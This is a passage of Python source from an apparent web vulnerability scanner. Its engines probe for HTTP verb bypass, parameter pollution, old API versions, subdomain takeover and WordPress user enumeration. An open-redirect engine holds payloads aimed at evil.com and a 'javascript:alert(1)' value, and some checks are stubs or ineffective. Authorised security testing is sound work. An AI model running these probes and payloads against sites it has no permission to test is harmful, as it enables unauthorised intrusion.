        cks  = self.sm.get_cookies_for_role("user_a")

        for node in nodes[:20]:
            url     = node["url"]
            methods = self._parse(node.get("method",'["GET"]'))
            await self._test_all_verbs(url, methods, hdrs, cks)
            await self._test_content_confusion(url, hdrs, cks)
            await self._test_api_versioning(url, hdrs, cks)
        return self.findings

    async def _test_all_verbs(self, url, known_methods, hdrs, cks):
        for verb in ["GET","POST","PUT","DELETE","PATCH","OPTIONS","HEAD"]:
            if verb in known_methods:
                continue
            resp = await self.http.request(
                verb, url, extra_headers=hdrs, session_cookies=cks
            )
            if resp and resp.status_code not in (405, 404, 410, 501):
                fid = self.db.add_finding(
                    type="HTTP_VERB_BYPASS", severity="MEDIUM",
                    endpoint=url, param="method", method=verb,
                    description=f"Undocumented HTTP verb accepted: {verb}",
                    proof_request=f"{verb} {url}",
                    proof_response=resp.text[:300], confidence=65
                )
                self.findings.append({"id": fid, "type": "HTTP_VERB_BYPASS"})
                self.log.finding("MEDIUM","HTTP VERB BYPASS", url, f"verb={verb}")

    async def _test_content_confusion(self, url, hdrs, cks):
        # Try sending JSON as XML and vice versa
        xml_body = "<root><data>test</data></root>"
        for ct in ["application/xml","text/xml"]:
            resp = await self.http.post(
                url, data=xml_body,
                extra_headers={**hdrs, "Content-Type": ct},
                session_cookies=cks
            )
            if resp and resp.status_code == 200:
                fid = self.db.add_finding(
                    type="CONTENT_TYPE_CONFUSION", severity="LOW",
                    endpoint=url, param="Content-Type", method="POST",
                    description=f"Endpoint accepts {ct} (unexpected)",
                    proof_request=f"POST {url} Content-Type: {ct}",
                    proof_response=resp.text[:200], confidence=55
                )
                self.findings.append({"id": fid, "type": "CONTENT_TYPE_CONFUSION"})

    async def _test_api_versioning(self, url, hdrs, cks):
        """Old API versions may lack security fixes."""
        import re as _re
        m = _re.search(r"/v(\d+)/", url)
        if not m:
            return
        ver = int(m.group(1))
        if ver <= 1:
            return
        old_url = url.replace(f"/v{ver}/", f"/v{ver-1}/")
        resp = await self.http.get(
            old_url, extra_headers=hdrs, session_cookies=cks
        )
        if resp and resp.status_code == 200:
            fid = self.db.add_finding(
                type="API_VERSION_BYPASS", severity="MEDIUM",
                endpoint=old_url, param="version", method="GET",
                description=f"Old API v{ver-1} still accessible — may lack security fixes",
                proof_request=f"GET {old_url}",
                proof_response=resp.text[:300], confidence=65
            )
            self.findings.append({"id": fid, "type": "API_VERSION_BYPASS"})
            self.log.finding("MEDIUM","API OLD VERSION", old_url)

    @staticmethod
    def _parse(s) -> list:
        if isinstance(s, list):
            return s
        try:
            return json.loads(s)
        except Exception:
            return ["GET"]


# ══════════════════════════════════════════════════════════
# E30 — Parameter Pollution Engine
# ══════════════════════════════════════════════════════════
class ParamPollutionEngine:
    def __init__(self, db, logger, http: HTTPClient, sm):
        self.db = db; self.log = logger; self.http = http; self.sm = sm
        self.findings = []

    async def run(self, target_url: str = None) -> List[Dict]:
        self.findings = []
        hdrs  = self.sm.get_headers_for_role("user_a")
        cks   = self.sm.get_cookies_for_role("user_a")
        uid_a = self.sm.get_user_id("user_a")
        uid_b = self.sm.get_user_id("user_b")
        if not uid_a or not uid_b:
            return []

        nodes = ([{"url": target_url, "params": "[]"}] if target_url
                 else self.db.get_all_nodes())

        for node in nodes[:20]:
            url    = node["url"]
            params = self._parse(node.get("params","[]"))
            for param in params[:5]:
                # HPP: duplicate param
                qs   = f"{param}={uid_a}&{param}={uid_b}"
                resp = await self.http.get(
                    url + f"?{qs}", extra_headers=hdrs, session_cookies=cks
                )
                baseline = self.db.get_baseline(url, "GET")
                if resp and baseline:
                    if abs(len(resp.content) - baseline.get("body_size",0)) > 100:
                        fid = self.db.add_finding(
                            type="HTTP_PARAM_POLLUTION", severity="MEDIUM",
                            endpoint=url, param=param, method="GET",
                            description=f"HPP: duplicate '{param}' param changes response",
                            proof_request=f"GET {url}?{qs}",
                            proof_response=resp.text[:300], confidence=65
                        )
                        self.findings.append({"id": fid, "type": "HPP"})
                        self.log.finding("MEDIUM","HTTP PARAM POLLUTION",
                                         url, f"param={param}")

                # JSON duplicate key
                body = {param: uid_a, f"{param}2": uid_b}
                resp2 = await self.http.post(
                    url, json_data={param: uid_a, **{param: uid_b}},
                    extra_headers=hdrs, session_cookies=cks
                )
        return self.findings

    @staticmethod
    def _parse(s) -> list:
        if isinstance(s, list):
            return s
        try:
            return json.loads(s)
        except Exception:
            return []


# ══════════════════════════════════════════════════════════
# E33 — Open Redirect Engine
# ══════════════════════════════════════════════════════════
class OpenRedirectEngine:
    PAYLOADS = [
        "https://evil.com", "//evil.com", "/\\evil.com",
        "https://evil.com@target.com", "%0d%0ahttps://evil.com",
        "javascript:alert(1)", "https://evil.com%23",
    ]
    REDIRECT_PARAMS = [
        "redirect", "redirect_uri", "redirect_url", "next", "return",
        "returnUrl", "return_url", "goto", "url", "link", "callback",
        "target", "destination", "continue", "forward",
    ]

    def __init__(self, db, logger, http: HTTPClient, sm):
        self.db = db; self.log = logger; self.http = http; self.sm = sm
        self.findings = []

    async def run(self, target_url: str = None) -> List[Dict]:
        self.findings = []
        nodes  = ([{"url": target_url, "params": "[]"}] if target_url
                  else self.db.get_all_nodes())
        hdrs   = self.sm.get_headers_for_role("user_a")
        cks    = self.sm.get_cookies_for_role("user_a")

        for node in nodes[:40]:
            url    = node["url"]
            params = self._parse(node.get("params","[]"))
            redir_params = [p for p in params
                            if p.lower() in self.REDIRECT_PARAMS]
            if not redir_params:
                redir_params = self.REDIRECT_PARAMS[:3]

            for param in redir_params:
                for payload in self.PAYLOADS[:4]:
                    # Disable follow_redirects to detect the redirect
                    client_no_follow = None
                    try:
                        import httpx
                        async with httpx.AsyncClient(
                            verify=False, follow_redirects=False, timeout=10
                        ) as c:
                            resp = await c.get(
                                url,
                                params={param: payload},
                                headers=hdrs
                            )
                        loc = resp.headers.get("location","")
                        if "evil.com" in loc or "javascript:" in loc:
                            fid = self.db.add_finding(
                                type="OPEN_REDIRECT", severity="MEDIUM",
                                endpoint=url, param=param, method="GET",
                                description=f"Open redirect via '{param}' to {payload}",
                                proof_request=f"GET {url}?{param}={payload}",
                                proof_response=f"Location: {loc}", confidence=88
                            )
                            self.findings.append({"id": fid, "type": "OPEN_REDIRECT"})
                            self.log.finding("MEDIUM","OPEN REDIRECT", url,
                                             f"param={param}")
                            break
                    except Exception:
                        pass
        return self.findings

    @staticmethod
    def _parse(s) -> list:
        if isinstance(s, list):
            return s
        try:
            return json.loads(s)
        except Exception:
            return []


# ══════════════════════════════════════════════════════════
# E34 — Subdomain Takeover Engine
# ══════════════════════════════════════════════════════════
class TakeoverEngine:
    FINGERPRINTS = {
        "github.io":       "There isn't a GitHub Pages site here",
        "herokuapp.com":   "No such app",
        "amazonaws.com":   "NoSuchBucket",
        "cloudfront.net":  "Bad request",
        "azurewebsites":   "404 Web Site not found",
        "shopify.com":     "Sorry, this shop is currently unavailable",
        "fastly.net":      "Fastly error: unknown domain",
        "pantheon.io":     "404 error unknown site",
        "wordpress.com":   "Do you want to register",
    }

    def __init__(self, db, logger, http: HTTPClient, sm):
        self.db = db; self.log = logger; self.http = http; self.sm = sm
        self.findings = []

    async def run(self, target_url: str = None) -> List[Dict]:
        self.findings = []
        subs = self.db.get_state("subdomain_list") or []
        if not subs:
            return []

        for sub in subs[:30]:
            url  = f"https://{sub}"
            resp = await self.http.get(url, retries=1)
            if not resp:
                # NXDOMAIN or unreachable — check fingerprints via CNAME
                await self._check_cname(sub)
            elif resp.status_code in (404, 502, 503):
                body = resp.text.lower()
                for service, sig in self.FINGERPRINTS.items():
                    if sig.lower() in body:
                        fid = self.db.add_finding(
                            type="SUBDOMAIN_TAKEOVER", severity="HIGH",
                            endpoint=url, param="subdomain", method="GET",
                            description=f"Subdomain takeover possible via {service}",
                            proof_request=f"GET {url} → {sig[:40]}",
                            proof_response=resp.text[:300], confidence=85
                        )
                        self.findings.append({"id": fid, "type": "SUBDOMAIN_TAKEOVER"})
                        self.log.finding("HIGH","SUBDOMAIN TAKEOVER", url,
                                         f"service={service}")
                        break
        return self.findings

    async def _check_cname(self, subdomain: str):
        try:
            import socket
            await asyncio.get_event_loop().run_in_executor(
                None, lambda: socket.gethostbyname(subdomain)
            )
        except socket.gaierror:
            # NXDOMAIN — takeover likely possible if CNAME points to unclaimed service
            pass


# ══════════════════════════════════════════════════════════
# E35 — WPScan Engine
# ══════════════════════════════════════════════════════════
class WPScanEngine:
    def __init__(self, db, logger, http: HTTPClient, sm):
        self.db = db; self.log = logger; self.http = http; self.sm = sm
        self.findings = []

    async def run(self, target_url: str = None) -> List[Dict]:
        self.findings = []
        tech = self.db.get_state("tech_stack") or {}
        if tech.get("framework") != "wordpress":
            self.log.info("WPScan: target is not WordPress — skipping")
            return []

        target = target_url or self.db.get_state("live_hosts", [""])[0]
        if not target:
            return []

        self.log.info(f"WPScan: running against {target}")

        # Manual WordPress checks first
        await self._check_wp_endpoints(target)

        # Try wpscan tool
        await self._run_wpscan_tool(target)
        return self.findings

    async def _check_wp_endpoints(self, base: str):
        base = base.rstrip("/")
        checks = [
            (f"{base}/wp-json/wp/v2/users",   "USER_ENUM"),
            (f"{base}/wp-login.php",           "WP_LOGIN"),
            (f"{base}/xmlrpc.php",             "XMLRPC"),
            (f"{base}/wp-admin/",              "WP_ADMIN"),
            (f"{base}/?author=1",              "AUTHOR_ENUM"),
        ]
        for url, check_type in checks:
            resp = await self.http.get(url, retries=1)
            if not resp:
                continue
            if check_type == "USER_ENUM" and resp.status_code == 200:
                try:
                    users = resp.json()
                    if isinstance(users, list) and users:
                        fid = self.db.add_finding(
                            type="WP_USER_ENUM", severity="MEDIUM",
                            endpoint=url, param="users", method="GET",
                            description=f"WordPress user enumeration: {len(users)} users exposed",
                            proof_request=f"GET {url}",
                            proof_response=resp.text[:400], confidence=90
                        )
                        self.findings.append({"id": fid, "type": "WP_USER_ENUM"})
                        self.log.finding("MEDIUM","WP USER ENUM", url,
                                         f"{len(users)} users")
                except Exception:
                    pass
            elif check_type == "XMLRPC" and resp.status_code == 200:
                if "xmlrpc" in resp.text.lower() or "xml" in resp.text.lower():
                    fid = self.db.add_finding(
                        type="WP_XMLRPC", severity="MEDIUM",
                        endpoint=url, param="xmlrpc", method="POST",
                        description="WordPress XMLRPC enabled — brute force amplification risk",
                        proof_request=f"GET {url}",
                        proof_response=resp.text[:200], confidence=85
                    )
                    self.findings.append({"id": fid, "type": "WP_XMLRPC"})
                    self.log.finding("MEDIUM","WP XMLRPC ENABLED", url)

    async def _run_wpscan_tool(self, target: str):
        try:
            proc = await asyncio.create_subprocess_exec(
                "wpscan", "--url", target, "--no-update",
                "--format", "json", "--output", "/tmp/wpscan_out.json",
                stdout=asyncio.subprocess.DEVNULL,
                stderr=asyncio.subprocess.DEVNULL
            )
            await asyncio.wait_for(proc.communicate(), timeout=120)
            import json as _json
            with open("/tmp/wpscan_out.json") as f:
                data = _json.load(f)
            vulns = data.get("vulnerabilities", [])
            for v in vulns[:10]:
                fid = self.db.add_finding(
                    type="WP_VULN", severity="HIGH",
                    endpoint=target, param="wordpress",
                    method="GET",
                    description=v.get("title", "WordPress vulnerability"),
                    proof_request=f"WPScan: {v.get('title','')}",
                    proof_response=str(v)[:400], confidence=80
                )
                self.findings.append({"id": fid, "type": "WP_VULN"})
                self.log.finding("HIGH","WP VULNERABILITY", target,
                                 v.get("title","")[:60])
        except asyncio.TimeoutError:
            self.log.warn("WPScan timed out after 120s")
        except Exception:
            self.log.warn("WPScan tool not found or failed")
